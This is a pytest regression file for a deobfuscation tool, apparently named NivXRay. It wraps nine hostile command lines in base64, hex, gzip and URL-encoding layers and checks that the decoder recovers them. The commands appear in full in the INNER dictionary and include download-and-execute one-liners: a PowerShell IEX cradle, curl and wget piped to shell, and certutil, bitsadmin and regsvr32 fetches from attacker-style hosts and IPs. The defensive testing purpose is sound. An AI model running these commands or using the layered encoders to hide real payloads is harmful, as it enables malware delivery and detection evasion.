"""
NivXRay — Multi-Layer Obfuscation Regression Battery (v1.5.6)

Runs 12 canonical multi-layer obfuscated command lines through the
in-process pipeline (`analysis_core.deterministic_best_decode`) and
asserts each payload decodes to text containing its expected LOLBIN
token (powershell, mshta, certutil, wget, curl, cmd, regsvr32, rundll32,
IEX). Also captures the X-RAY per-layer health BEFORE (raw) vs AFTER
(v1.5.6 SALVAGED downgrade) for the auditor's benefit.

Writes a JSON summary to `/app/backend/tests/reports/multilayer_battery.json`
which is served by the UI at `/benchmark → Battery` tab.
"""
from __future__ import annotations
import base64
import gzip
import json
import os
import re
import sys
import time
import urllib.parse
from pathlib import Path

import pytest

sys.path.insert(0, "/app/backend")
from smart_decoder import smart_decode  # noqa: E402
from wrapper_archetypes import try_archetypes  # noqa: E402

# ── payload builders ────────────────────────────────────────────────────
def _url_b64_hex_rev_b64(pt: str) -> str:
    l1 = base64.b64encode(pt.encode()).decode()
    l2 = l1[::-1]; l3 = l2.encode().hex()
    l4 = base64.b64encode(l3.encode()).decode()
    return urllib.parse.quote(l4)

def _url_b64_rev(pt: str) -> str: return urllib.parse.quote(base64.b64encode(pt.encode()).decode()[::-1])
def _url_b64(pt: str) -> str:      return urllib.parse.quote(base64.b64encode(pt.encode()).decode())
def _b64_hex(pt: str) -> str:      return base64.b64encode(pt.encode().hex().encode()).decode()
def _b64_gzip(pt: str) -> str:     return base64.b64encode(gzip.compress(pt.encode())).decode()
def _b64_b64_b64(pt: str) -> str:
    x = pt
    for _ in range(3):
        x = base64.b64encode(x.encode() if isinstance(x, str) else x).decode()
    return x
def _hex_b64_rev(pt: str) -> str:
    l1 = base64.b64encode(pt.encode()).decode()
    return l1[::-1].encode().hex()
def _url_url_b64(pt: str) -> str:  return urllib.parse.quote(urllib.parse.quote(base64.b64encode(pt.encode()).decode()))

INNER = {
    "cobalt":    'powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://45.148.10.181/beacon.ps1")',
    "mshta":     'mshta.exe javascript:a=new ActiveXObject("Wscript.Shell");a.Run("calc.exe");close();',
    "bitsadmin": 'cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe',
    "wget":      'wget -qO- http://198.51.100.42/loader.sh | bash',
    "regsvr32":  'regsvr32 /u /s /i:http://attacker.tld/file.sct scrobj.dll',
    "certutil":  'certutil -urlcache -split -f http://malicious.example/payload.exe C:\\ProgramData\\a.exe',
    "curl":      'curl -fsSL http://172.104.244.51/inst.sh | sh',
    "rundll32":  'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("Msxml2.XMLHTTP").open("GET","http://c2.example/x",false)',
    "iwr":       'IEX(iwr -useb http://39.108.99.24/a.ps1)',
}

SAMPLES = [
    ("S01_cobalt_5layer",     "URL(b64(hex(rev(b64(P)))))", _url_b64_hex_rev_b64(INNER["cobalt"]),   INNER["cobalt"],   "powershell"),
    ("S02_mshta_3layer",      "URL(rev(b64(P)))",           _url_b64_rev(INNER["mshta"]),            INNER["mshta"],    "mshta"),
    ("S03_certutil_3layer",   "URL(rev(b64(P)))",           _url_b64_rev(INNER["certutil"]),         INNER["certutil"], "certutil"),
    ("S04_curl_urlurl_b64",   "URL(URL(b64(P)))",           _url_url_b64(INNER["curl"]),             INNER["curl"],     "curl"),
    ("S05_iwr_url_b64",       "URL(b64(P))",                _url_b64(INNER["iwr"]),                  INNER["iwr"],      "IEX"),
    ("S06_bits_b64_hex",      "b64(hex(P))",                _b64_hex(INNER["bitsadmin"]),            INNER["bitsadmin"],"cmd"),
    ("S07_regsvr32_5layer",   "URL(b64(hex(rev(b64(P)))))", _url_b64_hex_rev_b64(INNER["regsvr32"]), INNER["regsvr32"], "regsvr32"),
    ("S08_wget_b64_gzip",     "b64(gzip(P))",               _b64_gzip(INNER["wget"]),                INNER["wget"],     "wget"),
    ("S09_cobalt_triple_b64", "b64(b64(b64(P)))",           _b64_b64_b64(INNER["cobalt"]),           INNER["cobalt"],   "powershell"),
    ("S10_rundll32_hex_b64",  "hex(b64(rev(P)))",           _hex_b64_rev(INNER["rundll32"]),         INNER["rundll32"], "rundll32"),
    ("S11_mshta_urlurl_b64",  "URL(URL(b64(P)))",           _url_url_b64(INNER["mshta"]),            INNER["mshta"],    "mshta"),
    ("S12_bits_url_b64",      "URL(b64(P))",                _url_b64(INNER["bitsadmin"]),            INNER["bitsadmin"],"cmd"),
]

# ── X-RAY health analyzer (mirror of DecodingTracePanel.jsx v1.5.6) ─────
def _raw_health(step):
    out = str(step.get("output_preview") or step.get("output") or "")
    op = str(step.get("op") or "").lower()
    if step.get("error"): return "BROKEN"
    if "base64" in op or "b64" in op:
        s = re.sub(r"[\s=]", "", out); mod = len(s) % 4
        if mod == 1: return "BROKEN"
        if re.search(r"[^A-Za-z0-9+/=_\-]", s[:200]): return "MIXED"
        return "OK"
    if "hex" in op and "family" not in op:
        c = re.sub(r"[\s\\x0]", "", out).lower()
        if len(c) % 2 or re.search(r"[^0-9a-f]", c[:200]): return "BROKEN"
        return "OK"
    if "url" in op:
        esc = re.findall(r"%(.{0,2})", out); bad = [e for e in esc if not re.match(r"^[0-9a-fA-F]{2}$", e)]
        return "BROKEN" if bad else "OK"
    p = len(re.findall(r"[\x20-\x7e\n\r\t]", out)) / max(len(out), 1)
    return "OK" if p >= 0.85 else "MIXED"

def _health_with_salvage(trace, i):
    lbl = _raw_health(trace[i])
    if lbl in ("BROKEN", "MIXED") and i < len(trace) - 1 and not trace[i].get("error"):
        n = trace[i + 1]
        if not n.get("error") and (n.get("output_length") or len(str(n.get("output_preview") or ""))) > 0:
            return "SALVAGED"
    return lbl

REPORT_PATH = Path("/app/backend/tests/reports/multilayer_battery.json")
REPORT_PATH.parent.mkdir(parents=True, exist_ok=True)

_RESULTS: list = []

@pytest.mark.parametrize("sid,wrap,payload,expected,expect_tok", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_multilayer_decodes_to_expected_token(sid, wrap, payload, expected, expect_tok):
    t0 = time.time()
    # Prefer smart_decode so we capture per-layer output_preview data for the
    # X-RAY SALVAGE badge computation. If it fails to reach the plaintext, we
    # fall through to the archetype fast-path as a safety net.
    d = smart_decode(payload)
    trace = d.get("trace") or d.get("steps") or []
    output = d.get("output") or ""
    if expect_tok.lower() not in output.lower():
        arch = try_archetypes(payload)
        if arch and (arch.get("output") or "").strip():
            d = arch
    dt_ms = int((time.time() - t0) * 1000)

    trace = d.get("trace") or d.get("steps") or []
    output = d.get("output") or ""
    engine = d.get("engine") or "?"

    # Build per-layer BEFORE/AFTER
    layers = []
    downgrades = 0
    for i, s in enumerate(trace):
        before = _raw_health(s)
        after  = _health_with_salvage(trace, i)
        if before != after: downgrades += 1
        layers.append({
            "idx": i, "op": s.get("op"),
            "bytes": s.get("output_length") or len(str(s.get("output_preview") or "")),
            "before": before, "after": after,
        })

    match = expect_tok.lower() in output.lower()
    _RESULTS.append({
        "sample_id": sid, "wrap": wrap,
        "encoded_input": payload,               # full opaque input (analyst can copy-paste)
        "encoded_input_preview": payload[:120] + ("…" if len(payload) > 120 else ""),
        "input_len": len(payload),
        "expected_plaintext": expected,         # ground truth (what SHOULD decode)
        "expect_token": expect_tok,
        "match": match, "engine": engine,
        "chain_len": len(trace), "downgrades": downgrades,
        "http_ms": dt_ms,
        "decoded_output": output[:2000],
        "output_first_line": output.split("\n")[0][:200],
        "layers": layers,
    })

    assert match, f"[{sid}] expected {expect_tok!r} in decoded output; got: {output[:200]!r}"


def teardown_module(module):
    """Persist a JSON summary consumable by /api/benchmark/multilayer."""
    total = len(_RESULTS)
    passed = sum(1 for r in _RESULTS if r["match"])
    summary = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "total": total,
        "passed": passed,
        "pass_rate": (passed / total) if total else 0,
        "total_salvage_downgrades": sum(r["downgrades"] for r in _RESULTS),
        "avg_http_ms": (sum(r["http_ms"] for r in _RESULTS) // total) if total else 0,
        "samples": _RESULTS,
    }
    REPORT_PATH.write_text(json.dumps(summary, indent=2))
